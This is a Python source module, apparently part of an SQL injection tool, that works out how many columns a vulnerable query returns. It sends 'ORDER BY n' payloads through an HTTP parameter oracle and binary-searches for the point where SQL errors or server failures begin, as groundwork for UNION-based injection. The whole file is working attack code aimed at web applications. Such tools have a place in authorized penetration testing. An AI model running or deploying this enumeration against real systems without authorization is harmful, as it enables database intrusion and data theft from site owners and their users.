#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""ORDER BY column enumeration for UNION planning."""

from __future__ import annotations

from typing import Optional

from .fingerprint import match_sqli_error
from .injection_context import InjectionContext
from .oracle import HttpParameterOracle, ProbeResponse


def _order_by_payload(ctx: InjectionContext, column: int) -> str:
    return ctx.append_sql(f" ORDER BY {int(column)}{ctx.comment}")


def _order_by_failed(resp: ProbeResponse, baseline: ProbeResponse) -> bool:
    if match_sqli_error(resp.text):
        return True
    if resp.status_code >= 500 and baseline.status_code < 500:
        return True
    if resp.status_code == 0:
        return True
    return False


def find_union_column_count(
    oracle: HttpParameterOracle,
    ctx: InjectionContext,
    baseline: ProbeResponse,
    *,
    max_columns: int = 20,
) -> Optional[int]:
    """
    Binary search column count using ORDER BY n.

    Returns the last *n* that did not look like an SQL error (>=1).
    """
    limit = max(3, min(int(max_columns), 32))
    low, high = 1, limit
    best: Optional[int] = None

    while low <= high:
        mid = (low + high) // 2
        resp = oracle.send(_order_by_payload(ctx, mid))
        if _order_by_failed(resp, baseline):
            high = mid - 1
        else:
            best = mid
            low = mid + 1

    if best is not None:
        return best

    resp_one = oracle.send(_order_by_payload(ctx, 1))
    if not _order_by_failed(resp_one, baseline):
        return 1
    return None
